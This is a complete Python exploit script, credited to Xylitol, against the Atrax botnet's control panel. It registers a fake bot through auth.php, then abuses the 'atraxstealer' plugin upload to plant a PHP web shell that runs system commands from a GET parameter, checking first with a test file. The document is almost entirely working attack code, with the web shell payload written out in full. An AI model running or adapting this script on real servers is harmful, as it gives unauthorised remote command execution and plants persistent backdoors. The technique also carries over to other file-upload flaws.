

Type:  Shell Upload Vulnerability

Author: [Xylitol](https://twitter.com/Xylit0l)

```
import random
import string
import base64
import urllib
import urllib2

# <CONFIG>
payload = '<pre><?php if(isset($_GET["c"]))system($_GET["c"]);else echo("No input?");?></pre>'
url     = 'http://localhost/atrax/'
# </CONFIG>

BOT_MODE_INSERT             = 'b' # BOT MODE
BOT_MODE_RUNPLUGIN          = 'e'
GET_PARAM_MODE              = 'a' # GET PARAM
POST_PARAM_GUID             = 'h' # POST PARAM
POST_PARAM_IP               = 'i'
POST_PARAM_BUILDID          = 'j'
POST_PARAM_PC               = 'k'
POST_PARAM_OS               = 'l'
POST_PARAM_ADMIN            = 'm'
POST_PARAM_CPU              = 'n'
POST_PARAM_GPU              = 'o'
POST_PARAM_PLUGINNAME       = 'q'

def request(url, get, post):
        if not get == '':
                url += '?' + get
        encoded = {}
        if not post == '':
                for _ in post.split('&'):
                        data             = _.split('=')
                        encoded[data[0]] = data[1]
        encoded  = urllib.urlencode(encoded)
        request  = urllib2.Request(url, encoded)
        response = urllib2.urlopen(request)
        page     = response.read()
        return page

def queryValue(key, value, next=True):
        ret = key + '=' + value
        if next:
                ret += '&'
        return ret

def randomString(length = 8):
        return ''.join(random.choice(string.ascii_lowercase + string.digits) for i in range(length))

def createVictim(url, guid, ip):
        get   = queryValue(GET_PARAM_MODE,     BOT_MODE_INSERT, False)
        post  = queryValue(POST_PARAM_GUID,    guid)
        post += queryValue(POST_PARAM_IP,      ip)
        post += queryValue(POST_PARAM_BUILDID, randomString())
        post += queryValue(POST_PARAM_PC,      randomString())
        post += queryValue(POST_PARAM_OS,      randomString())
        post += queryValue(POST_PARAM_ADMIN,   'yes')
        post += queryValue(POST_PARAM_CPU,     randomString())
        post += queryValue(POST_PARAM_GPU,     randomString(), False)
        return request(url + 'auth.php', get, post)

def exploit(url, guid, ip, file, payload):
        get   = queryValue(GET_PARAM_MODE,        BOT_MODE_RUNPLUGIN, False)
        post  = queryValue(POST_PARAM_PLUGINNAME, 'atraxstealer')
        post += queryValue(POST_PARAM_GUID,       guid)
        post += queryValue(POST_PARAM_IP,         ip)
        post += queryValue('am',                  randomString())
        post += queryValue('ad',                  file)
        post += queryValue('ab',                  base64.b64encode(payload))
        post += queryValue('ai',                  '18', False)
        request(url + 'auth.php', get, post)
 
def testExploit(url, guid, ip):
        file    = randomString() + '.php'
        payload = '<?php echo("1337"); ?>'
        exploit(url, guid, ip, file, payload)
        return request(url + 'plugins/atraxstealer/wallet/' + file, '', '').strip() == '1337'

guid    = '7461707a7461707a7461707a7461707a'
ip      = '91.224.13.103'
file    = randomString() + '.php'
if createVictim(url, guid, ip).strip() == 'STOP':
        print '[-] Cannot create victim...'
else:
        print '[~] Victim created/updated...'
        if testExploit(url, guid, ip):
                exploit(url, guid, ip, file, payload)
                print '[+] Exploit uploaded!'
                print '=> ' + url + 'plugins/atraxstealer/wallet/' + file
        else:
                print '[-] Cannot upload payload, maybe the plugin is not actived?'
```
